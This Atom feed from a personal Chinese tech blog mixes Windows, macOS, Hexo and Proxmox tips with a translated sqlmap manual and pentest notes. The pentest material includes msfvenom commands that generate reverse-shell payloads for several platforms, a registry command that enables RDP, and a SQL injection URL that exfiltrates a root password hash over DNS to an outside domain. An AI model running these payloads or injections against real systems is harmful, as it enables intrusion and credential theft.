<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[lonelyorWiki]]></title>
  <link href="http://www.lonelyor.org/lonelyorWiki/atom.xml" rel="self"/>
  <link href="http://www.lonelyor.org/lonelyorWiki/"/>
  <updated>2019-12-30T15:51:05+08:00</updated>
  <id>http://www.lonelyor.org/lonelyorWiki/</id>
  <author>
    <name><![CDATA[]]></name>
    
  </author>
  <generator uri="http://www.mweb.im/">MWeb</generator>
  
  <entry>
    <title type="html"><![CDATA[整改中]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15776921791111.html"/>
    <updated>2019-12-30T15:49:39+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15776921791111.html</id>
    <content type="html"><![CDATA[
<p>我意识到我的这种博客很烂，所以我最近在整理笔记内容。
暂时不更新了，或者说更多的更新在笔记中而不是博客中，等更新完了上新的博客内容。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[msfvenom各类木马生成脚本]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15747334018156.html"/>
    <updated>2019-11-26T09:56:41+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15747334018156.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">python</h2>

<p>msfvenom -p python/meterpreter/reverse_tcp LHOST=10.3.8.124 LPORT=4444 -f raw -p /tmp/shell.py</p>

<h2 id="toc_1">php</h2>

<p>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.3.8.124 LPORT=4444 -f raw &gt; /tmp/shell.php</p>

<h2 id="toc_2">bash</h2>

<p>msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw &gt; shell.sh</p>

<h2 id="toc_3">linux</h2>

<p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f elf &gt; shell.elf</p>

<h2 id="toc_4">windows</h2>

<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe &gt; shell.exe</p>

<h2 id="toc_5">mac</h2>

<p>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f macho &gt; shell.macho</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[v2ray实现科学上网]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15724200154293.html"/>
    <updated>2019-10-30T15:20:15+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15724200154293.html</id>
    <content type="html"><![CDATA[
<p>1、linux一键安装
bash &lt;(curl -L -s <a href="https://install.direct/go.sh">https://install.direct/go.sh</a>)</p>

<p>此脚本会自动安装以下文件：</p>

<p>/usr/bin/v2ray/v2ray：V2Ray 程序；
/usr/bin/v2ray/v2ctl：V2Ray 工具；
/etc/v2ray/config.json：配置文件；
/usr/bin/v2ray/geoip.dat：IP 数据文件
/usr/bin/v2ray/geosite.dat：域名数据文件</p>

<p>2、后面的我会了就不写了...2333</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[windows渗透技巧]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15708455642675.html"/>
    <updated>2019-10-12T09:59:24+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15708455642675.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">windows中如何使用cmd通过注册表开启3389端口</h2>

<p>开启3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>

<p>查看3389端口开启情况
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber
注意： Terminal与Server之间有且只有一个空格。双引号为英文的双引号</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Proxmox物理安装]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15692949172295.html"/>
    <updated>2019-09-24T11:15:17+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15692949172295.html</id>
    <content type="html"><![CDATA[
<p>首先是配置虚拟机，除了常规的内存、硬盘、cpu之外，还需要开启虚拟化支持选项。
<img src="media/15692949172295/15692950722388.jpg" alt="" style="width:640px;"/>
然后将网络设置为“仅主机”模式。</p>

<p>创建虚拟机后，选择第一项安装 Proxmox VE
<img src="media/15692949172295/15692949396239.jpg" alt="" style="width:1151px;"/></p>

<p><img src="media/15692949172295/15692951403076.jpg" alt="" style="width:1072px;"/></p>

<p><img src="media/15692949172295/15692951518730.jpg" alt="" style="width:1072px;"/></p>

<p><img src="media/15692949172295/15692951705782.jpg" alt="" style="width:1072px;"/></p>

<p><img src="media/15692949172295/15692952000522.jpg" alt="" style="width:1072px;"/></p>

<p><img src="media/15692949172295/15692952425847.jpg" alt="" style="width:1072px;"/></p>

<p><img src="media/15692949172295/15692952591378.jpg" alt="" style="width:1072px;"/></p>

<p><img src="media/15692949172295/15692954089959.jpg" alt="" style="width:1072px;"/></p>

<p><img src="media/15692949172295/15692954631339.jpg" alt="" style="width:1012px;"/></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Windows常用技巧与问题汇总]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15655143025936.html"/>
    <updated>2019-08-11T17:05:02+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15655143025936.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">windows下创建和启动wifi</h2>

<p>整理文件时候找到了3年前写的东西：</p>

<p>创建 wifi
netsh wlan set hostednetwork mode=allow ssid=!@#$%<sup>&amp;*</sup> key=passwd123
启动 wifi
netsh wlan start hostednetwork</p>

<h2 id="toc_1">虚拟机安装win10操作系统</h2>

<blockquote>
<p>本片文章是为新手准备的</p>
</blockquote>

<p>虚拟机安装win10可以查看以下教程：
<a href="http://baijiahao.baidu.com/s?id=1597148758310739517&amp;wfr=spider&amp;for=pc">http://baijiahao.baidu.com/s?id=1597148758310739517&amp;wfr=spider&amp;for=pc</a></p>

<p>若原文链接失效，则可以百度搜索“虚拟机安装win10操作系统”</p>

<h2 id="toc_2">解决windows右键新建消失问题</h2>

<p>新建一个文件后缀名写为reg（注册表文件格式）的文件。
然后用记事本或文本编辑器打开，写入文件内容：</p>

<pre class="line-numbers"><code class="language-text">Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\Directory\Background\shellex\ContextMenuHandlers\New]

@=&quot;{D969A300-E7FF-11d0-A93B-00A0C90F2719}&quot;
</code></pre>

<p>保存，然后双击该文件，即可。</p>

<h2 id="toc_3">OneDrive映射到本地（像访问本地磁盘一样访问网盘）</h2>

<p>参考以下链接即可：
<a href="http://baijiahao.baidu.com/s?id=1549908946659905&amp;wfr=spider&amp;for=pc">http://baijiahao.baidu.com/s?id=1549908946659905&amp;wfr=spider&amp;for=pc</a></p>

<p>举一反三，webdav、nfs、samba等都可以使用这种方式挂载，来方便访问。</p>

<h2 id="toc_4">windows右键添加管理员获得所有权</h2>

<blockquote>
<p>右键添加获得管理员所有权是个比较方便的功能。</p>
</blockquote>

<p>打开记事本或者别的文本编辑器，然后写入如下内容:</p>

<pre class="line-numbers"><code class="language-bat">Windows Registry Editor Version 5.00

[HKEY_CLASSES_ROOT\*\shell\runas]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\*\shell\runas\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
[HKEY_CLASSES_ROOT\exefile\shell\runas2]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\exefile\shell\runas2\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F&quot;
[HKEY_CLASSES_ROOT\Directory\shell\runas]
@=&quot;管理员取得所有权&quot;
&quot;NoWorkingDirectory&quot;=&quot;&quot;
[HKEY_CLASSES_ROOT\Directory\shell\runas\command]
@=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;
&quot;IsolatedCommand&quot;=&quot;cmd.exe /c takeown /f \&quot;%1\&quot; /r /d y &amp;&amp; icacls \&quot;%1\&quot; /grant administrators:F /t&quot;
</code></pre>

<p>然后另存为：管理员获得所有权.reg
文件名可以随便写，但是后缀记得写成reg（改成这个后缀后文件图标就会变成一个破碎蓝色魔方）。
然后右键以管理员身份运行，若弹框注册表xxx的，同意就行了。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hexo守护进程]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15655136450838.html"/>
    <updated>2019-08-11T16:54:05+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15655136450838.html</id>
    <content type="html"><![CDATA[
<p>Node进程守护有很多工具，Forever，PM2，PM2.5 blah blah.解决的问题也是很容易讲清楚，比如：ssh登陆服务器，启动node服务，然后ssh断开连接，服务中断，网站无法访问。这里讲一下用forever 解决 Hexo 进程守护的问题，安装Forever:</p>

<pre class="line-numbers"><code class="language-shell">$ npm install forever -g
$# cd /path/to/your/project
$ npm install forever-monitor
</code></pre>

<p>Hexo下新建一个app.js,写入下面代码：</p>

<pre class="line-numbers"><code class="language-text">var spawn = require(&#39;child_process&#39;).spawn;
free = spawn(&#39;hexo&#39;, [&#39;server&#39;, &#39;-p 4000&#39;]);/*其实就是等于执行hexo server -p 4000*/
free.stdout.on(&#39;data&#39;, function (data) {
console.log(&#39;standard output:\n&#39; + data);
});
free.stderr.on(&#39;data&#39;, function (data) { 
console.log(&#39;standard error output:\n&#39; + data);
});
free.on(&#39;exit&#39;, function (code, signal) {
console.log(&#39;child process eixt ,exit:&#39; + code);
});
</code></pre>

<p>此处输入代码其实思路也很简单，大致意思就是node启动一个子进程，用forever 守护 hexo sever -p 4000这条命令（4000代表端口），关于node的child_process的相关知识，请自行baidu、google,或者去查nodejs<code>此处输入代码</code>的文档。</p>

<h1 id="toc_0">执行forever命令：</h1>

<p><code>$ forever --minUptime 10000 --spinSleepTime 26000 start app.js</code></p>

<p>至于后面这几个minUptime、spinSleepTime可填可不填，不填默认也会有，参数的意思可以直接去forever上查询。</p>

<h1 id="toc_1">停止服务</h1>

<p>这里值得注意的是你拿forever启动的服务，通过forever stopall是根本停不掉的，因为其实你执行的是hexo sever，可以通过下面的办法：</p>

<pre class="line-numbers"><code class="language-shell">＄lsof -i:[port]
＄ps aux|grep hexo
＄kill pid(进程的id)
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[北京的这些定点医疗机构，应该这么选才对自己有利]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15652412679530.html"/>
    <updated>2019-08-08T13:14:27+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15652412679530.html</id>
    <content type="html"><![CDATA[
<p><a href="http://k.sina.com.cn/article_6375948226_17c093fc2001002lp1.html">http://k.sina.com.cn/article_6375948226_17c093fc2001002lp1.html</a></p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[MacOS常用技巧与问题汇总]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15649354856110.html"/>
    <updated>2019-08-05T00:18:05+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15649354856110.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">1. quicktime player 录制屏幕的时候不能暂停怎么办？</h2>

<p>文章转载自：<a href="https://zhidao.baidu.com/question/2117520508734516867.html">https://zhidao.baidu.com/question/2117520508734516867.html</a></p>

<p>Mac自带的QuickTime还是很强大的，不过在录制的时候发现只能停止，不能暂停，其实是有解决方法的，按照以下步骤进行：</p>

<ol>
<li>打开QuickTime Player，点击影片-&gt;新建屏幕录制（ˆ ⌘N）</li>
<li>点击鼠标左键开始录制（选取区域也行）
注意，下面是关键步骤3.点击dock上的QuickTime player图标，让QuickTime处于活动状态
4.按下键盘的Esc出来正在录制的QuickTime界面，点击中间的停止可以停止录制</li>
<li>按下键盘的option（Alt）键，这时候奇迹出现了，停止按键变成了暂停，</li>
<li>下面的不用说喽~
另外，QuickTime还可以录制iPhone、iPad等的屏幕，在新建影片录制里，录制后面有个下三角，点击一下，可以选择的。</li>
</ol>

<h2 id="toc_1">2. 高分辨率下解决虚拟机模糊的问题</h2>

<p>Mac 分辨率太高导致虚拟机中字体模糊，调高分辨率后字体太小看不清怎么办？主要原因是hidpi设置问题。
解决办法是：
1、安装hidpi相关驱动
2、打开虚拟机显示中的相关设置</p>

<p>如果开启hidpi后字体太小，可以前往虚拟操作系统的设置中设置dpi值，不同桌面环境的设置位置和方法略有不同。</p>

<h2 id="toc_2">Docker for Mac 卡在 &quot;is starting&quot;</h2>

<blockquote>
<p>解决方案来自：<a href="https://github.com/docker/for-mac/issues/2420">https://github.com/docker/for-mac/issues/2420</a> 中的sagidM的回复</p>
</blockquote>

<p>本机环境：
macOS 10.14.4
Docker Engine: 18.09.2</p>

<p><img src="media/15604965103558/15604966419596.jpg" alt=""/></p>

<p>大意是，打开终端然后输入<code>screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</code>，接着回车几次，就 ok 了。事实证明这个方法确实能解决问题。如果你输入一次没什么反应，就多开几个终端多试几次就可以了。</p>

<h2 id="toc_3">Mac下的 VMware Fusion 端口映射</h2>

<blockquote>
<p>文章转载自：<a href="https://blog.csdn.net/weixin_43302757/article/details/82911332">https://blog.csdn.net/weixin_43302757/article/details/82911332</a></p>
</blockquote>

<p>Windows版本VM进行端口映射有相关的设置界面，但是Mac系统的VM（VMware Fusion）没有。Google 以下找到相关方法。具体步骤如下</p>

<p>打开配置文件
<code>sudo vi  /Library/Preferences/VMware\ Fusion/vmnet8/nat.conf</code>
找到如下配置</p>

<pre class="line-numbers"><code class="language-text">[incomingtcp]
# Use these with care - anyone can enter into your VM through these...
# The format and example are as follows:
#&lt;external port number&gt; = &lt;VM&#39;s IP address&gt;:&lt;VM&#39;s port number&gt;
23 = 172.16.161.129:22 #将IP172.16.161.129虚拟机的22 端口映射到主机23端口
</code></pre>

<p>重启VM的网络服务</p>

<pre class="line-numbers"><code class="language-text">sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --stop
sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --start
</code></pre>

<h2 id="toc_4">Mac 终端设置欢迎页</h2>

<p><code>cd /etc</code>
<code>sudo pico motd</code>
输入密码后会打开nano，然后在里面输入图案或者文字。然后保存后退出，之后打开终端就能看到欢迎页了。</p>

<p>其实本质就是在/etc目录下创建文件 motd，然后往里面写内容即可。</p>

<p>我只是添加了一段文字，结果如下：</p>

<p><img src="media/15532282104799/15532284069773.jpg" alt=""/></p>

<h2 id="toc_5">使用Mac对磁盘进行分区，显示“Mediakit报告设备商的空间不足以执行此操作”</h2>

<p>网上大部分都写的去 windows 中使用DiskGenius重新分区，这搞麻烦了，不用这么麻烦的。</p>

<p>1、打开终端，输入<code>diskutil list</code>列出磁盘内容，这里我们可以找到要格式化的磁盘，我是 disk2
2、卸载要格式化的磁盘<code>diskutil unmountDisk force disk2</code>
3、写入启动扇区<code>sudo dd if=/dev/zero of=/dev/disk2 bs=1024 count=1024</code>
4、对磁盘进行分区<code>diskutil partitionDisk disk2 GPT JHFS+ &quot;AWESOME DISK&quot; 0g</code>
5、打完收工，写博客发出来。</p>

<h2 id="toc_6">iterm2 常用技巧</h2>

<p>按住 com 键</p>

<ul>
<li>可以拖拽选中字符串</li>
<li>点击url能直接打开</li>
<li>点击文件：调用默认程序打开文件</li>
<li>点击文件夹：在finder中打开文件夹</li>
<li>同时按住option键，可以矩形选中</li>
</ul>

<p>新建windows：cmd+N
新建tab：cmd+T
切分屏幕：cmd+D水平切分
智能查找，支持正则：cmd+F</p>

<p>智能补全：cmd+；
调用历史记录：cmd+shift+h</p>

<h2 id="toc_7">Mac大小写切换</h2>

<p>无论中文还是英文状态下,按住 shift 输入即是大写</p>

<p>长按 caps lock 2s 灯亮后输入即是大写</p>

<h2 id="toc_8">校验文件md5</h2>

<p>打开终端
使用命令 md5 或 shawun 即可查看。</p>

<h2 id="toc_9">修改Mac主机名、计算机名</h2>

<p><code>$sudo scutil --set ComputerName 你想要的计算机名称</code>
<code>$sudo scutil --set HostName 你想要的主机名称</code></p>

<p>举例：
<code>$sudo scutil --set HostName lonelyor</code></p>

<p>使用以下命令查看主机名或计算机名
<code>$ scutil --get ComputerName</code>
<code>$ scutil --get HostName</code></p>

<h2 id="toc_10">Mac 启动 apache</h2>

<p>apachectl start</p>

<h2 id="toc_11">Mac 启动 tomcat</h2>

<p>brew services start tomcat  开始</p>

<p>brew services stop tomcat  停止</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[sqlmap 详细文档中文版]]></title>
    <link href="http://www.lonelyor.org/lonelyorWiki/15648965459106.html"/>
    <updated>2019-08-04T13:29:05+08:00</updated>
    <id>http://www.lonelyor.org/lonelyorWiki/15648965459106.html</id>
    <content type="html"><![CDATA[
<p>转载自：<a href="https://blog.csdn.net/u012763794/article/details/52638931">https://blog.csdn.net/u012763794/article/details/52638931</a></p>

<pre class="line-numbers"><code class="language-text">         _
 ___ ___| |_____ ___ ___  {1.0.9.8#dev}
|_ -| . | |     | .&#39;| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org
</code></pre>

<pre class="line-numbers"><code class="language-text">用法
Usage: python sqlmap.py [options]
Options: 选项
  -h, --help            Show basic help message and exit
    基本的帮助信息
  -hh                   Show advanced help message and exit
    更加详细的帮助信息
  --version             Show program&#39;s version number and exit
    版本信息
  -v VERBOSE            Verbosity level: 0-6 (default 1)
这个是设置sqlmap输出信息的详细程度，默认是1,设置成3（-v 3）就显示出payload的信息了，这个非常适合学习的一个参数
 
下面给出sqlmap.config文件中的对这个的详细描述
    # Verbosity level.
    # Valid: integer between 0 and 6
    # 0: Show only error and critical messages  只显示错误和关键信息
    # 1: Show also warning and info messages    警告和信息
    # 2: Show also debug messages               调试信息
    # 3: Show also payloads injected            payload，如：[15:32:10] [PAYLOAD] 1)&#39;,(..)&quot;(&quot;
    # 4: Show also HTTP requests                整个GET报文都看到了
    # 5: Show also HTTP responses&#39; headers         返回报文的头部 
    # 6: Show also HTTP responses&#39; page content    返回的html代码都有了
    # Default: 1
 
  Target: 目标
    At least one of these options has to be provided to define the
    target(s)
    至少从下面选择设定一个目标，最常用的就是 -u url了。

    -d DIRECT           Connection string for direct database connection
    直接连接数据库，如：mysql的话
        -d mysql://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME
        不过的话呢，这个我试过是要装第三方库的
    -u URL, --url=URL   Target URL (e.g. &quot;http://www.site.com/vuln.php?id=1&quot;)
        这个指定url的肯定最熟悉了
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
        burp用的多，但这个应该我们很少用啊，在burp的option-misc里面有个logging选项保存log文件
        查了一下：加多两个参数效率更快
        python sqlmap.py -l 文件名 --batch -smart
            batch：自动选yes。
            smart：启发式快速判断，节约时间。
    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file
        从xml文件中解析目标
    -m BULKFILE         Scan multiple targets given in a textual file
        这个应该是从大文件中读取超级多的目标，一般文件多了就一部分一部分地读了，这个就像是一个大字典
    -r REQUESTFILE      Load HTTP request from a file
        这个也用的较多，尤其是POST注入，将一些抓包软件（如burp）抓到的HTTP报文直接保存在文件中，跟着-r就搞掂了
    -g GOOGLEDORK       Process Google dork results as target URLs
        通过google搜索找到的url作为目标，这个也是google hacking了
    -c CONFIGFILE       Load options from a configuration INI file
        通过ini文件设置选项，这个还用过啊,下面的--save参数就是保存参数到ini文件的了，这个方便下次再次黑它

 
  Request: 请求
    These options can be used to specify how to connect to the target URL
 
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
        指定HTTP请求的方法，GET，POST，PUT，MOVE等
    --data=DATA         Data string to be sent through POST
        指定POST的参数
    --param-del=PARA..  Character used for splitting parameter values
        这个拆分一些参数的，如下面用;拆分post参数
        python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users
    --cookie=COOKIE     HTTP Cookie header value
        指定cookie值
    --cookie-del=COO..  Character used for splitting cookie values
        指定分割cookie值的字符是什么
    --load-cookies=L..  File containing cookies in Netscape/wget format
        这个是从文件中读取cookie吧，Netscape/wget格式的
    --drop-set-cookie   Ignore Set-Cookie header from response
        忽略响应包的Set-Cookie头
    --user-agent=AGENT  HTTP User-Agent header value
        指定User-Agent用户代理
    --random-agent      Use randomly selected HTTP User-Agent header value
        随机选用sqlmap目录中的User-Agent，这个文件再txt目录
    --host=HOST         HTTP Host header value
        指定主机头
    --referer=REFERER   HTTP Referer header value
        指定Referer头，就是请求来源的意思
    -H HEADER, --hea..  Extra header (e.g. &quot;X-Forwarded-For: 127.0.0.1&quot;)
        指定某个头部，如： -H &quot;X-Forwarded-For: 127.0.0.1&quot;
    --headers=HEADERS   Extra headers (e.g. &quot;Accept-Language: fr\nETag: 123&quot;)
        这个的话应该是可以指定多个，用\n分割
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
        指定http认证类型
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
        指定http认证的账户名和密码，就行apache就可以设置访问某个目录时要认证
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
        指定一个私钥文件来认证
    --ignore-401        Ignore HTTP Error 401 (Unauthorized)
        忽略401错误
    --proxy=PROXY       Use a proxy to connect to the target URL
        指定代理
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
        指定代理的认证信息，就是账号密码
    --proxy-file=PRO..  Load proxy list from a file
        从文件中选择代理
    --ignore-proxy      Ignore system default proxy settings
        忽略系统默认代理
    --tor               Use Tor anonymity network
        使用tor网络
    --tor-port=TORPORT  Set Tor proxy port other than default
        设置tor的端口，如果不是默认端口的话
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
        设置tor代理的类型
    --check-tor         Check to see if Tor is used properly
        检测tor能不能用
    --delay=DELAY       Delay in seconds between each HTTP request
        设置每个HTTP请求的时间间隔，这个在有些限制单位时间请求数的防火墙的时候可以用得到，我上次就用过
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
        设置超时时间，默认30秒
    --retries=RETRIES   Retries when the connection timeouts (default 3)
        设置重试的次数，默认3次
    --randomize=RPARAM  Randomly change value for given parameter(s)
        随机地更改给定参数的值
    --safe-url=SAFEURL  URL address to visit frequently during testing
        有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求
        这里提供一个安全不错误的连接，每隔一段时间都会去访问一下
    --safe-post=SAFE..  POST data to send to a safe URL
        这里设置一个正确的post数据
    --safe-req=SAFER..  Load safe HTTP request from a file
        从文件中读取安全，或者叫正确的http请求
    --safe-freq=SAFE..  Test requests between two visits to a given safe URL
        设置访问安全url的时间间隔
    --skip-urlencode    Skip URL encoding of payload data
        不进行url编码
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
        设置CSRF的token
    --csrf-url=CSRFURL  URL address to visit to extract anti-CSRF token
 
    --force-ssl         Force usage of SSL/HTTPS
        强制使用https
    --hpp               Use HTTP parameter pollution method
        尝试了一下，只能用于ASP，得到报错信息如下：
        [WARNING] HTTP parameter pollution should work only against ASP(.NET) targets
 
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        &quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;)
        发送请求之前，先运行这段python代码，比如对某个参数进行处理
        比如下面的，hash参数就是id的md5值
        python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;
 
  Optimization: 一些优化
    These options can be used to optimize the performance of sqlmap
 
    -o                  Turn on all optimization switches
        开启所有优化选项
    --predict-output    Predict common queries output
        预测常见的查询输出，可能跟一些报错出数据库信息那些有关，具体应要看源码才能说，有机会的话我看源码补充下
    --keep-alive        Use persistent HTTP(s) connections
        使用持久连接
    --null-connection   Retrieve page length without actual HTTP response body
        获得页面的长度（应该有多少字符吧，这个具体我也不确定） 除去HTTP的响应的body部分
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
        设置线程，默认为1
 
  Injection: 注入
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts
 
    -p TESTPARAMETER    Testable parameter(s)
        设定测试的参数，sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。
        这里就给你自己设定了 例如： -p &quot;id,user-agent&quot;
 
    --skip=SKIP         Skip testing for given parameter(s)
        跳过测试给定的参数
    --skip-static       Skip testing parameters that not appear dynamic
        跳过测试参数是否是静态的
    --dbms=DBMS         Force back-end DBMS to this value
        指定后端的数据库类型（mysql，mssql等）
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
        指定数据库的认证信息(user:password)
    --os=OS             Force back-end DBMS operating system to this value
        指定后台的系统类型
    --invalid-bignum    Use big numbers for invalidating values
        使用大数字（说是无效值），比如payload会出现8446744073709551610这样大的，配合-v 3就能看到
    --invalid-logical   Use logical operations for invalidating values
        使用逻辑字符，比如下面的：
            SELECT CHR(101)&amp;CHR(99)&amp;CHR(108)&amp;CHR(89)
            SELECT CHAR(82)+CHAR(90)+CHAR(71)+CHAR(84))
            SELECT CHAR(67)||CHAR(88)||CHAR(73)||CHAR(105)
    --invalid-string    Use random strings for invalidating values
        使用随机字符
    --no-cast           Turn off payload casting mechanism
        这个看着英文像是关闭payload构造机制
    --no-escape         Turn off string escaping mechanism
        关闭字符串逃逸机制
    --prefix=PREFIX     Injection payload prefix string
        设置注入的前缀，比如单引号注入点就设置前缀为单引号
    --suffix=SUFFIX     Injection payload suffix string
        设置注入payload的后缀
    --tamper=TAMPER     Use given script(s) for tampering injection data
        使用给定的脚本去修改payload中的数据，达到绕过WAF的目的
 
  Detection: 发现
    These options can be used to customize the detection phase
 
    --level=LEVEL       Level of tests to perform (1-5, default 1)
        这个的话，sqlmap使用测试的方法就越多，发送越多请求，耗时也越长
    --risk=RISK         Risk of tests to perform (1-3, default 1)
        boolean-based blind SQL injection tests with AND are considered risk 1, with OR are considered risk 3：这句话是从sqlmap配置文件中找的，就是说基于布尔型盲注and型的就是risk1，or型的就是risk3，那么risk2是两个都搞？
    --string=STRING     String to match when query is evaluated to True
        设置一些返回页面中的字符，页面返回这个字符，说明我们的注入判断语句是正确的
    --not-string=NOT..  String to match when query is evaluated to False
        设置返回页面没返回某个字符，就是判断错误
    --regexp=REGEXP     Regexp to match when query is evaluated to True
        用正则匹配告诉sqlmap返回什么是正确的
    --code=CODE         HTTP code to match when query is evaluated to True
        用HTTP的响应码来判断注入判断语句是正确的，例如，响应200的时候为真，响应401的时候为假，可以添加参数--code=200
    --text-only         Compare pages based only on the textual content
        真条件下的返回页面与假条件下返回页面是不同可以使用这个
    --titles            Compare pages based only on their titles
        真条件下的返回页面的标题与假条件下返回页面的标题是不同可以使用这个
 
  Techniques: 注入技术
    These options can be used to tweak testing of specific SQL injection
    techniques
 
    --technique=TECH    SQL injection techniques to use (default &quot;BEUSTQ&quot;)
        指定注入技术，默认使用全部(default &quot;BEUSTQ&quot;)，那个含义如下：
        # B: Boolean-based blind SQL injection
        # E: Error-based SQL injection
        # U: UNION query SQL injection
        # S: Stacked queries SQL injection
        # T: Time-based blind SQL injection
        # Q: Inline SQL injection
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
        使用基于时间的盲注时，设置的数据库延迟，默认是5
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
        设置联合查询列的数目的范围
    --union-char=UCHAR  Character to use for bruteforcing number of columns
        设定union查询使用的字符，默认使用NULL
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
        这个就不知道了，使用表单中的元素放到union注入中？
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
        利用dns进行注入加快盲注，可以看看这个
        http://blog.csdn.net/qq_27446553/article/details/51794326
        示例url：http://localhost/inject.php?user=123&#39; and if((SELECT LOAD_FILE(CONCAT(、\\\&#39;,(SELECT concat(user,&#39;_&#39;,mid(password,2,41)) from user where ser=&#39;root&#39; limit 1),&#39;.md5crack.cn\\foobar&#39;))),1,1)%23 
    --second-order=S..  Resulting page URL searched for second-order response
        这个就是我们常说的二次注入了，设置后帮你寻找二次注入的页面，不过没用过。。。
  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint
        这个应该是数据库指纹识别，加了可能识别更好
  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements
    -a, --all           Retrieve everything
        检索所有，这是拖库的节奏啊
    -b, --banner        Retrieve DBMS banner
        检索数据库的一些标志性的信息，就是指纹这样子吧
    --current-user      Retrieve DBMS current user
        检索当前连接数据库的用户
